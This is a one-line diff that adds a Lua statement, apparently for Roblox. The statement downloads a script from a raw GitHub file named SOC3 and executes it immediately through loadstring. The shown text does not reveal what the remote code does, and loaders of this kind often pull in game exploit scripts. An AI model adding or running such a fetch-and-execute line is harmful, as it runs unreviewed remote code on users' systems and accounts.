@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imtiyaslentra/SOC3/refs/heads/main/SOC3"))()
